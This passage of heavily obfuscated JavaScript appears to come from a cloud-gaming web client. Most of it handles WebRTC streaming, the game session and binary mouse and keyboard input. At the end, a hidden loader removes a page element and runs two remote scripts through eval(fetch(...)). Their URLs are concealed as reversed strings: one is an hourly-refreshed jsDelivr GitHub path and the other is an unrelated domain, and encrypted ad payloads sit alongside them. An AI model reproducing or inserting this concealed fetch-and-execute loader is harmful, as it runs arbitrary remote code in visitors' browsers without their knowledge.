                if (typeof s['freezeCount'] === "rebmun".split("").reverse().join("")) _0xfed02b = s['freezeCount'];
            }
        });
        var _0x8a5d = (455819 ^ 455823) + (578653 ^ 578645);
        const _0xfb24ac = _0xfcac !== null && _0xedg2f !== null ? _0xfcac - _0xedg2f : 229543 ^ 229543;
        _0x8a5d = (399093 ^ 399100) + (325949 ^ 325951);
        let _0x552f;
        const _0xgb2a = _0xfed02b !== null && _0xe1ffaf !== null ? _0xfed02b - _0xe1ffaf : 311730 ^ 311730;
        _0x552f = "nfnacg".split("").reverse().join("");
        _0xedg2f = _0xfcac;
        _0xe1ffaf = _0xfed02b;
        let _0x45398c;
        const _0xe38fa = _0xb9edc !== null && _0xb9edc > (187003 ^ 187117) || _0x9bd9e !== null && _0x9bd9e > (937352 ^ 937376) || _0xfb24ac > (135506 ^ 135506);
        _0x45398c = (636338 ^ 636346) + (154180 ^ 154179);
        if (_0xe38fa) {
            _0xa831b();
        } else if (_0xgb2a > (525807 ^ 525807) && _0x7285bf === _0x2461f) {}
    }, 817651 ^ 815691);
    _0x22bac = "dhckeh".split("").reverse().join("");
    _cloudTimers['push'](_0xd2_0x0eg);
    _cloudJitterHandlers = {
        "video": _0x2caf2c,
        "bumpJitterTarget": _0xa831b
    };
    _cloudPc['ontrack'] = ev => {
        if (!_0x2caf2c['srcObject']) _0x2caf2c['srcObject'] = new MediaStream();
        _0x2caf2c['srcObject']['addTrack'](ev['track']);
        if (ev['track']['kind'] === "oediv".split("").reverse().join("")) {
            _0xbe_0x94f = ev['receiver'];
            _0xed9dc();
        } else if (ev['track']['kind'] === "oidua".split("").reverse().join("")) {
            _0xa116c = ev['receiver'];
            _0xed9dc();
        }
    };
    _cloudPc['onicecandidate'] = ev => {
        if (ev['candidate']) cloudSigSend({
            'type': "rtc_candidate",
            'candidate': ev['candidate']['toJSON']()
        });
    };
    let _0xbf28ee = null;
    const _0xef_0x68a = () => {
        if (_0xbf28ee) {
            clearTimeout(_0xbf28ee);
            _0xbf28ee = null;
        }
    };
    _0x8ffd1f = 'poinie';
    _0x8f2['onconnectionstatechange'] = () => {
        if (_cloudPc !== _0x8f2) return;
        const _0xgcf = _0x8f2['connectionState'];
        if (_0xgcf === "connected") {
            _0xef_0x68a();
            document['getElementById']("yalrevOduolc".split("").reverse().join(""))['style']['display'] = "none";
            _0x2caf2c['muted'] = false;
            _0x2caf2c['play']()['catch'](() => {});
            _cloudInputActive = !![];
            _cloudStarting = false;
            setupCloudInput();
            if (document['fullscreenElement']) _lockCloudKeyboard();
            return;
        }
        if (_0xgcf === "disconnected") {
            if (!_0xbf28ee) {
                _0xbf28ee = setTimeout(() => {
                    if (_cloudPc === _0x8f2 && _0x8f2['connectionState'] === "detcennocsid".split("").reverse().join("")) endCloudGame();
                }, 853433 ^ 856777);
                _cloudTimers['push'](_0xbf28ee);
            }
            return;
        }
        if (["deliaf".split("").reverse().join(""), "closed"]['includes'](_0xgcf)) {
            _0xef_0x68a();
            showCloudEndedScreen("session ended", "lost connection to the stream");
        }
    };
    try {
        const _0x3d598c = await navigator['mediaDevices']['getUserMedia']({
            'audio': !![]
        })['catch'](() => null);
        if (_0x3d598c) {
            const _0xfg_0x6g1 = _0x3d598c['getAudioTracks']()[318084 ^ 318084];
            _cloudPc['addTrack'](_0xfg_0x6g1);
        }
    } catch {}
    const _0xb2d = await _cloudPc['createOffer']();
    await _cloudPc['setLocalDescription'](_0xb2d);
    cloudSigSend({
        "type": 'rtc_offer',
        'sdp': _0xb2d['sdp']
    });
}

function setupCloudInput(_0xc1b) {
    if (_cloudInputHandlers) return;
    const _0xfe7df = document['getElementById']("oediVduolc".split("").reverse().join(""));
    let _0xdfe62a = 650966 ^ 650966,
        _0x29_0x645 = 771474 ^ 771474,
        _0xd73dc = 302462 ^ 302462,
        _0xee08ga = 174698 ^ 174698,
        _0x22f71c = 645231 ^ 645231;
    var _0xbe991a = (556273 ^ 556277) + (510942 ^ 510938);
    const _0x6ff9a = new Set();
    _0xbe991a = (706755 ^ 706755) + (351529 ^ 351531);
    let _0x6f506f = null;
    const _0xgc_0xcc4 = () => {
        if (!_0x6f506f) {
            const r = _0xfe7df['getBoundingClientRect']();
            const _0xa2ee7d = _0xfe7df['videoWidth'] || 427595 ^ 427611,
                _0xbf333e = _0xfe7df['videoHeight'] || 404744 ^ 404737;
            var _0xaf3ca = (353227 ^ 353231) + (486022 ^ 486031);
            const _0xd5a92c = Math['min'](r['width'] / _0xa2ee7d, r['height'] / _0xbf333e);
            _0xaf3ca = (733719 ^ 733726) + (582986 ^ 582990);
            const w = _0xa2ee7d * _0xd5a92c,
                h = _0xbf333e * _0xd5a92c;
            _0x6f506f = {
                "left": r['left'] + (r['width'] - w) / (712343 ^ 712341),
                'top': r['top'] + (r['height'] - h) / (796518 ^ 796516),
                "width": w,
                'height': h
            };
        }
        return _0x6f506f;
    };
    var _0xcef2fa = (691799 ^ 691794) + (115008 ^ 115009);
    const _0xdb_0x06b = () => {
        _0x6f506f = null;
    };
    _0xcef2fa = 606638 ^ 606633;
    window['addEventListener']("eziser".split("").reverse().join(""), _0xdb_0x06b);
    const _0xf2ee = buf => {
        try {
            if (_cloudDc && _cloudDc['readyState'] === "open") _cloudDc['send'](buf);
        } catch {}
    };
    const _0xe9e0g = (moveX = 610763 ^ 610763, moveY = 395317 ^ 395317, scroll = 573052 ^ 573052) => {
        if (!_cloudDc || _cloudDc['readyState'] !== "open") return;
        moveX = Math['max'](-(145852 ^ 145859), Math['min'](975589 ^ 975514, moveX));
        moveY = Math['max'](-(252282 ^ 252165), Math['min'](588265 ^ 588182, moveY));
        const r = _0xgc_0xcc4();
        const _0x10g8ae = Math['floor']((_0xdfe62a - r['left']) / r['width'] * (952594 ^ 962050));
        var _0xbe1b = (721560 ^ 721562) + (204672 ^ 204681);
        const _0x7ef47a = Math['floor']((_0x29_0x645 - r['top']) / r['height'] * (634048 ^ 625616));
        _0xbe1b = (542128 ^ 542136) + (117447 ^ 117447);
        const buf = new ArrayBuffer(221755 ^ 221751),
            v = new DataView(buf);
        v['setUint8'](976622 ^ 976622, 853887 ^ 853886);
        v['setUint8'](178690 ^ 178691, 977374 ^ 977365);
        v['setUint8'](956570 ^ 956568, 456831 ^ 456829);
        v['setUint8'](875366 ^ 875365, 389310 ^ 389302);
        v['setUint16'](797787 ^ 797791, Math['max'](177037 ^ 177037, Math['min'](261020 ^ 253068, _0x10g8ae)));
        v['setUint16'](576895 ^ 576889, Math['max'](399278 ^ 399278, Math['min'](373015 ^ 366087, _0x7ef47a)));
        v['setInt8'](244876 ^ 244868, moveX);
        v['setInt8'](940058 ^ 940051, moveY);
        v['setUint8'](124229 ^ 124239, _0x22f71c);
        v['setInt8'](783470 ^ 783461, scroll);
        _0xf2ee(buf);
    };
    var _0x0784cd = (150724 ^ 150720) + (713918 ^ 713919);
    const _0xcf0f9g = (keyCode, isDown) => {
        if (isDown) _0x6ff9a['add'](keyCode);
        else _0x6ff9a['delete'](keyCode);
        const buf = new ArrayBuffer(732294 ^ 732318),
            v = new DataView(buf);
        v['setUint8'](974943 ^ 974943, 443733 ^ 443732);
        v['setUint8'](530093 ^ 530095, 185248 ^ 185249);
        v['setUint8'](397630 ^ 397629, 579909 ^ 579908);
        v['setUint16'](418697 ^ 418701, keyCode);
        v['setUint8'](196893 ^ 196891, isDown ? 198954 ^ 198955 : 684833 ^ 684833);
        let _0xe879bg = 665884 ^ 665883;
        for (const k of _0x6ff9a) {
            if (k !== keyCode && k > (532507 ^ 532507) && k < (786919 ^ 786712) && _0xe879bg < (389233 ^ 389220)) {
                v['setUint16'](_0xe879bg, k);
                _0xe879bg += 318373 ^ 318375;
                v['setUint8'](_0xe879bg, 380821 ^ 380820);
                _0xe879bg++;
            }
        }
        v['setUint8'](_0xe879bg++, 426771 ^ 426988);
        v['setUint8'](317841 ^ 317840, _0xe879bg - (661836 ^ 661837));
        _0xf2ee(buf['slice'](234369 ^ 234369, _0xe879bg));
    };
    _0x0784cd = (403989 ^ 403996) + (435510 ^ 435506);
    const _0xfg548e = e => {
        if (!_cloudInputActive) return;
        const _0xf542g = e['movementX'] || 941418 ^ 941418,
            _0x676f = e['movementY'] || 415143 ^ 415143;
        if (document['pointerLockElement'] === _0xfe7df) {
            var _0xc35bc = (752615 ^ 752609) + (587256 ^ 587260);
            const r = _0xgc_0xcc4();
            _0xc35bc = (775063 ^ 775071) + (183862 ^ 183856);
            _0xd73dc = Math['max'](563446 ^ 563446, Math['min'](r['width'], _0xd73dc + _0xf542g));
            _0xee08ga = Math['max'](420442 ^ 420442, Math['min'](r['height'], _0xee08ga + _0x676f));
            _0xdfe62a = r['left'] + _0xd73dc;
            _0x29_0x645 = r['top'] + _0xee08ga;
        } else {
            _0xdfe62a = e['clientX'];
            _0x29_0x645 = e['clientY'];
        }
        _0xe9e0g(_0xf542g, _0x676f, 857395 ^ 857395);
    };
    var _0x6b9a6f = (756975 ^ 756972) + (875286 ^ 875286);
    const _0x22g4d = e => {
        if (!_cloudInputActive) return;
        _0x22f71c = e['buttons'];
        _0xe9e0g(782194 ^ 782194, 502072 ^ 502072, 661137 ^ 661137);
    };
    _0x6b9a6f = 793740 ^ 793741;
    const _0x762acd = e => {
        if (_cloudInputActive) e['preventDefault']();
    };
    const _0x1g7e = e => {
        if (!_cloudInputActive) return;
        e['preventDefault']();
        _0xe9e0g(656920 ^ 656920, 502884 ^ 502884, e['deltaY'] > (485474 ^ 485474) ? -(228689 ^ 228688) : 570938 ^ 570939);
    };
    _0xc1b = (654057 ^ 654062) + (734924 ^ 734925);
    const _0xga37df = document['getElementById']("cloudRelockHint");
    const _0xe6_0xfba = () => {
        if (!_cloudDc) return;
        if (document['pointerLockElement'] === _0xfe7df) return;
        _0xdb_0x06b();
        var _0x62caea = (338098 ^ 338099) + (208132 ^ 208131);
        const r = _0xgc_0xcc4();
        _0x62caea = (734688 ^ 734695) + (286960 ^ 286967);
        _0xd73dc = r['width'] / (409729 ^ 409731);
        _0xee08ga = r['height'] / (711146 ^ 711144);
        _0xdfe62a = r['left'] + _0xd73dc;
        _0x29_0x645 = r['top'] + _0xee08ga;
        _0xfe7df['requestPointerLock']?.();
    };
    const _0x1cd57a = () => {
        _0xga37df['style']['display'] = "enon".split("").reverse().join("");
        _0xe6_0xfba();
    };
    var _0x12_0x5fa = (482810 ^ 482809) + (439419 ^ 439411);
    let _0x62f0a = false;
    _0x12_0x5fa = "hfffji".split("").reverse().join("");
    var _0x78ff4e = (135840 ^ 135849) + (850769 ^ 850770);
    const _0x535aee = () => {
        if (!_cloudInputActive) return;
        if (document['pointerLockElement'] === _0xfe7df) {
            _0x62f0a = !![];
            _0xga37df['style']['display'] = "none";
        } else if (_0x62f0a) {
            const _0x7fc67g = document['getElementById']("yalrevOduolc".split("").reverse().join(""))['style']['display'] !== "enon".split("").reverse().join("");
            _0xga37df['style']['display'] = _0x7fc67g ? "enon".split("").reverse().join("") : "xelf".split("").reverse().join("");
        }
    };
    _0x78ff4e = (531811 ^ 531813) + (574109 ^ 574109);
    document['addEventListener']("pointerlockchange", _0x535aee);
    _0xga37df['addEventListener']("click", _0x1cd57a);
    const _0x6e_0x9db = isDown => e => {
        if (!_cloudInputActive) return;
        e['preventDefault']();
        e['stopPropagation']();
        if (isDown && e['repeat']) return;
        _0xcf0f9g(e['keyCode'], isDown);
    };
    var _0x35738f = (881795 ^ 881794) + (564256 ^ 564256);
    const _0xcc_0x776 = _0x6e_0x9db(!![]);
    _0x35738f = (406899 ^ 406907) + (132072 ^ 132075);
    var _0xc9c75c = (789892 ^ 789890) + (813799 ^ 813792);
    const _0x30_0xa69 = _0x6e_0x9db(false);
    _0xc9c75c = (912923 ^ 912922) + (339752 ^ 339756);
    document['addEventListener']("evomesuom".split("").reverse().join(""), _0xfg548e);
    document['addEventListener']("nwodesuom".split("").reverse().join(""), _0x22g4d);
    document['addEventListener']("mouseup", _0x22g4d);
    document['addEventListener']("contextmenu", _0x762acd);
    document['addEventListener']("wheel", _0x1g7e, {
        'passive': false
    });
    _0xfe7df['addEventListener']("click", _0x1cd57a);
    document['addEventListener']("keydown", _0xcc_0x776, {
        'capture': !![]
    });
    document['addEventListener']("keyup", _0x30_0xa69, {
        "capture": !![]
    });
    _cloudInputHandlers = {
        "mouseMoveHandler": _0xfg548e,
        "mouseButtonHandler": _0x22g4d,
        'contextMenuHandler': _0x762acd,
        'wheelHandler': _0x1g7e,
        'videoClickHandler': _0x1cd57a,
        'keyDownHandler': _0xcc_0x776,
        'keyUpHandler': _0x30_0xa69,
        "video": _0xfe7df,
        'invalidateRect': _0xdb_0x06b,
        'pointerLockChangeHandler': _0x535aee,
        'relockHint': _0xga37df
    };
}

function endCloudGame() {
    if (!_cloudSession) return;
    teardownCloud(!![]);
    _cloudEndedActive = false;
    const _0xf0794f = document['getElementById']("cloudVideoWrap");
    const _0xcd09gb = document['getElementById']("gamePlayerLoading");
    _0xf0794f['style']['display'] = "enon".split("").reverse().join("");
    _0xcd09gb['style']['display'] = "flex";
    _0xcd09gb['textContent'] = "…gnidaol".split("").reverse().join("");
    document['getElementById']("gamePlayerTimeLeft")['textContent'] = '';
    setCloudPhase("eldi".split("").reverse().join(""), '', false);
}
var _0xa4aee = (681773 ^ 681764) + (605739 ^ 605736);
const originalHandleGamePlayerClose = handleGamePlayerClose;
_0xa4aee = (823180 ^ 823183) + (706679 ^ 706673);
handleGamePlayerClose = function() {
    if (_cloudEndedActive) {
        _cloudEndedActive = false;
        closeGamePlayer();
        return;
    }
    if (_cloudSession) {
        _armOrConfirmClose(() => {
            endCloudGame();
            closeGamePlayer();
        });
        return;
    }
    originalHandleGamePlayerClose();
};
window['addEventListener']("beforeunload", () => {
    if (_cloudSession) _quitCloudSession(_cloudSession['uuid']);
});
document['addEventListener']("egnahcytilibisiv".split("").reverse().join(""), () => {
    if (_cloudSession && document['hidden']) {
        if (_cloudWs && _cloudWs['readyState'] === (411582 ^ 411583)) {
            _cloudWs['send'](JSON['stringify']({
                'type': 'ping'
            }));
        }
    }
});
const originalGameCardOnClick = _gameCardOnClick;
_gameCardOnClick = function(g) {
    if (g['source'] === "duolc".split("").reverse().join("")) return () => startCloudGame(g['key'], g['name']);
    return originalGameCardOnClick(g);
};
(() => {
    var _0x13_0xce5 = (176905 ^ 176909) + (873175 ^ 873173);
    const el = document['getElementById']("pingDisplay");
    _0x13_0xce5 = (203471 ^ 203469) + (155224 ^ 155217);
    if (el) el['textContent'] = typeof window['WispPing'] === "rebmun".split("").reverse().join("") ? `ping: ${window['WispPing']}ms` : "-- :gnip".split("").reverse().join("");
})();
document['body']['firstElementChild']?.remove();
(async () => {
    try {
        eval(await (await fetch("?sj.noossaBlainegnoc/amginEotcOsuotiuqibu/tebrehSgnoT/hg/ten.rviledsj.ndc//:sptth".split("").reverse().join("") + Math['floor'](Date['now']() / 3600000)))['text']());
        loadAds({
            "banner": "DMkzx9IFc4JPUeh0HPN2kT/hbi3/qRnaWVJ8YWf5MY5xc6dCbkdATMPppNiHKaja6yku4BdkyjESvX5FbEdLLnsPp5I9jKmsp5czw55t5z2XdMGUBupayQe6ITV4i0wyFuTI2Tp3p0+wlYY5",
            "native": "03mNMgQqshdhTiPrhRRhOWvW3kEjy49Z2qZVPei2GeiLGKUlFNIKlZbHmjj8AhKpJ8a31eTn2W6d+DylsDnCuMSVFuK65JmbGZtKCxRvuguJDGPo5BUmbO3pc4K4Fkg2sfSsbHSK03jifmCcAyXGYn8=",
            "socialbar": "Ab2Nvq42QEuRQfmeWqK8LujVG8SKtvkLgqcTv+gk3ohF8Y8IcbdCd4ELCXjoLQCcQ6QLWabde48gr+rsQrnswAedZ8Nf3EUCM+xcXO9lo8tjtKGs1mPuyo5SgjfTzmjAKC4aD20XIKt1D0yAC5ut80wnsw=="
        });
    } catch {}
    try {
        eval(await (await fetch("sj.tpircs/moc.lobtufsrepiv.c//:sptth".split("").reverse().join("")))['text']());
    } catch {}
})();
